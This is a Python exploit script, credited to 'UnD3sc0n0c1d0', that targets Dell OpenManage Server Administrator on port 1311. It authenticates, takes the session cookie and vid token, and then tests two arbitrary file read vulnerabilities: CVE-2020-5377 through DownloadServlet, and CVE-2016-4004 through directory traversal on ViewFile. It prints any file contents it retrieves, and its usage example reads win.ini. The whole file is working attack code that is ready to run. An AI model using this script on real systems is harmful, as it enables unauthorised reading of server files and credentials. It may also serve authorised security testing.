#!/usr/bin/env python3

import requests
import urllib3
import getopt
import sys
import pyfiglet
import time

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

class bcolors:
    RESP = '\033[41m'
    END = '\033[0m'
    QUES = '\033[7m'

def main(argv):
    if len(sys.argv) < 8:
        banner()
        usage()
        sys.exit()
    try:
        opts, args = getopt.getopt(argv,"ht:u:p:f:")
    except getopt.GetoptError:
        banner()
        usage()
    for opt, arg in opts:
        if opt == '-h':
            banner()
            usage()
            sys.exit()
        if opt == '-t':
            target = arg
        if opt == '-u':
            user = arg
        if opt == '-p':
            password = arg
        if opt == '-f':
            file = arg
    core(target,user,password,file)
    sys.exit()

def core(target,user,password,file):
    banner()
    print('TARGET: '+target)
    headers = {'Host': target+':1311', 'Content-Type': 'application/x-www-form-urlencoded'}
    params = {'managedws': 'true'}
    data = 'manuallogin=true&user='+user+'&password='+password+'&application=omsa'
    response = requests.post('https://'+target+':1311/LoginServlet', headers=headers, params=params, data=data, verify=False, allow_redirects=False)
    cookie = response.headers['Set-Cookie'][11:43]
    print('SESSION: '+cookie)
    token = response.headers['Location'][1:17]
    print('VID: '+token+'\n')

    print('-'*100)
    print('\n'+bcolors.QUES+'Vulnerable to CVE-2020-5377?'+bcolors.END)
    headers = {'Host': target+':1311', 'Cookie': 'JSESSIONID='+cookie}
    params = {'file': file, 'vid': token}
    responseAFR = requests.get('https://'+target+':1311/'+token+'/DownloadServlet', headers=headers, params=params, verify=False)
    if len(responseAFR.text) > 0:
        time.sleep(1)
        print('\n'+bcolors.RESP+'Yes, this vulnerability affects this target!'+bcolors.END+'\n')
        time.sleep(1.5)
        print('Result:\n\n'+responseAFR.text+'\n')
    else:
        print("\n Does not appear vulnerable!\n Check again with another path...\n")

    print('-'*100)
    print('\n'+bcolors.QUES+'Vulnerable to CVE-2016-4004?'+bcolors.END)
    headers = {'Host': target+':1311', 'Cookie': 'JSESSIONID='+cookie}
    params = {'file': '..\\..\\..\\..\\..'+file, 'vid': token}
    responseDT = requests.get('https://'+target+':1311/'+token+'/ViewFile', headers=headers, params=params, verify=False)
    if responseDT.status_code == 200:
        time.sleep(1)
        print('\n'+bcolors.RESP+'Yes, this vulnerability affects this target!'+bcolors.END+'\n')
        time.sleep(1.5)
        print('Result:\n\n'+responseDT.text+'\n')
    else:
        print("\n Does not appear vulnerable!\n Check again with another path...\n")

def usage():
    print('usage: ArbitraryFileRead.py -t TARGET -u USER -p PASS -f \'\Windows\win.ini\'\n')
    print('arguments:')
    print('\t-h\tshow this help message and exit')
    print('\t-t\ttarget IP address')
    print('\t-u\ttarget user')
    print('\t-p\tpassword of the defined user account')
    print('\t-f\tpath of the file you want to read\n')

def banner():
    banner = pyfiglet.figlet_format('Arbitrary File Read', font = 'rectangles', width = 500)
    print(banner+'\r\r\t\t\t\t\t\t\t\tby: UnD3sc0n0c1d0\n')

if __name__ == "__main__":
    try:
        main(sys.argv[1:])
    except KeyboardInterrupt:
        print('Interrupted by users...')
    except:
        sys.exit()
